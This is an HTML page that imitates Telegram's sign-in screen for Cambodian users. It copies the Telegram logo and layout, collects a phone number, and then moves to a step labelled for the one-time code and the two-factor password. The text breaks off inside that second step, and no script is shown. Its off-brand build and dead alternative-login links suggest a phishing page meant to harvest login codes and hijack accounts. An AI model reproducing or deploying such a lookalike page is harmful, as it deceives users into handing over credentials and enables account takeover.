<!DOCTYPE html>
<html lang="km">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in to Telegram</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  :root {
    --bg: #171717;
    --card-border: #383838;
    --text-main: #ffffff;
    --text-sub: #aaaaaa;
    --accent: #8774e1;
    --accent-hover: #7966d3;
  }
  * { box-sizing: border-box; touch-action: manipulation; }
  body {
    margin: 0;
    min-height: 100vh;
    background: var(--bg);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    padding: 20px;
    color: var(--text-main);
    user-select: none;
  }
  .card {
    width: 100%;
    max-width: 450px;
    text-align: center;
  }
  .logo {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    margin: 0 auto 24px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    background: #2481cc;
  }
  .logo svg {
    width: 100%;
    height: 100%;
  }
  h1 {
    color: var(--text-main);
    font-size: 48px;
    font-weight: 600;
    margin: 0 0 16px;
  }
  p.sub {
    color: var(--text-sub);
    font-size: 32px;
    font-weight: 400;
    line-height: 1.4;
    margin: 0 0 36px;
    padding: 0 10px;
  }
  .field {
    position: relative;
    border: 1px solid var(--card-border);
    border-radius: 16px;
    padding: 22px 20px 12px;
    margin-bottom: 20px;
    text-align: left;
    background: var(--bg);
  }
  .field:focus-within {
    border-color: var(--accent);
  }
  .field label {
    position: absolute;
    top: -12px;
    left: 16px;
    background: var(--bg);
    padding: 0 6px;
    font-size: 26px;
    font-weight: 400;
    color: #888888;
  }
  .field input, .field select {
    width: 100%;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text-main);
    font-size: 36px !important;
    font-weight: 400;
  }
  .country-select {
    display: flex;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
  }
  .country-info {
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .flag-emoji {
    font-size: 36px;
    line-height: 1;
  }
  .country-info span {
    color: var(--text-main);
    font-size: 36px;
    font-weight: 400;
  }
  .dropdown-arrow {
    color: var(--text-sub);
    font-size: 20px;
  }
  .checkbox-row {
    display: flex;
    align-items: center;
    gap: 16px;
    margin: 28px 0 36px 4px;
    text-align: left;
    cursor: pointer;
    user-select: none;
  }
  .checkbox-row input {
    display: none;
  }
  .checkmark {
    width: 28px;
    height: 28px;
    background-color: #2b2b2b;
    border-radius: 6px;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: background-color 0.2s;
  }
  .checkbox-row input:checked + .checkmark {
    background-color: var(--accent);
  }
  .checkbox-row input:checked + .checkmark::after {
    content: "✔";
    font-size: 16px;
    color: #ffffff;
  }
  .checkbox-row span { 
    color: #dddddd; 
    font-size: 36px; 
    font-weight: 400;
  }
  .btn-primary {
    width: 100%;
    background-color: var(--accent);
    color: white;
    border: none;
    padding: 20px;
    border-radius: 16px;
    font-size: 36px;
    font-weight: 500;
    cursor: pointer;
    transition: background-color 0.2s, transform 0.05s;
  }
  .btn-primary:hover {
    background-color: var(--accent-hover);
  }
  .btn-primary:active {
    transform: scale(0.98);
  }
  .alt-links {
    margin-top: 32px;
    display: flex;
    flex-direction: column;
    gap: 24px;
  }
  .alt-links a {
    color: var(--accent);
    text-decoration: none;
    font-size: 36px;
    font-weight: 500;
    letter-spacing: 0.5px;
  }
  .alt-links a:hover {
    opacity: 0.8;
  }
</style>
</head>
<body>
  <div class="card">
    
    <!-- STEP 1: Phone Form -->
    <div id="step-phone">
      <!-- Telegram SVG Logo -->
      <div class="logo">
        <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="120" cy="120" r="120" fill="#2481CC"/>
          <path d="M52.5 119.5L181.5 69C187.5 66.5 192.5 70 190.5 77L167.5 184C166 190.5 161.5 192 156 188.5L120.5 161.5L103.5 178C101.5 180 100 181.5 97 181.5L99.5 145.5L164.5 86.5C167.2 84.1 163.9 82.7 160.3 85.1L84.3 133.1L51.3 122.8C44.1 120.6 44.3 115.6 52.5 119.5Z" fill="white"/>
        </svg>
      </div>
      
      <h1>Telegram</h1>
      <p class="sub">Please confirm your country code and enter your phone number.</p>

      <!-- Country Field -->
      <div class="field">
        <label>Country</label>
        <div class="country-select">
          <div class="country-info">
            <span class="flag-emoji">🇰🇭</span>
            <span>Cambodia</span>
          </div>
          <span class="dropdown-arrow">▼</span>
        </div>
      </div>

      <!-- Phone Number Field -->
      <div class="field">
        <label>Your phone number</label>
        <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
      </div>

      <!-- Keep me signed in -->
      <label class="checkbox-row">
        <input type="checkbox" checked />
        <span class="checkmark"></span>
        <span>Keep me signed in</span>
      </label>

      <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>

      <!-- តំណភ្ជាប់ខាងក្រោម -->
      <div class="alt-links">
        <a href="#">LOG IN BY QR CODE</a>
        <a href="#">LOG IN WITH PASSKEY</a>
      </div>
    </div>

    <!-- STEP 2: OTP & 2FA Form -->
    <div id="step-otp" class="space-y-6 hidden">
      <div class="text-6xl mb-4">🔐</div>
      <div>
        <h2 id="display-phone" class="text-2xl font-semibold mb-2 text-white"></h2>
        <p class="text-gray-40
